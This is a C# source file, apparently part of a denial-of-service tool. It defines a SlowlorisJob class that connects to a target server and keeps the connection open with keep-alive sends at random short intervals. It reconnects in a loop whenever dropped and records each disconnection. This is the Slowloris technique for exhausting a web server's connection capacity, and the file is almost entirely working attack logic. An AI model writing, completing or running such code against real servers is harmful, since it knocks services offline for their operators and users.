
internal class SlowlorisJob
{
    private readonly TargetInfo _target;
    private readonly Connection _connection;
    private readonly WaitHandle _signalHandle;

    public bool IsRunning => _connection is not null && _connection.Connected;

    public SlowlorisJob(TargetInfo target, WaitHandle signalHandle)
    {
        _target = target;
        _signalHandle = signalHandle;
        _connection = new Connection(target, _signalHandle);
    }

    public async Task Run()
    {
        while (!_signalHandle.WaitOne(1))
        {
            try
            {
                await _connection.ConnectAsync();
            }
            catch { continue; }
            while (_connection.Connected && !_signalHandle.WaitOne(1))
            {
                try
                {
                    await _connection.KeepAliveAsync();
                }
                catch { break; }
                await Task.Delay(new Random().Next(0, 500));
            }
            Statistics.Instance.RecordDisconnected(_target.host);
        }
        _connection.Disconnect(false);
        _connection.Dispose();
    }
}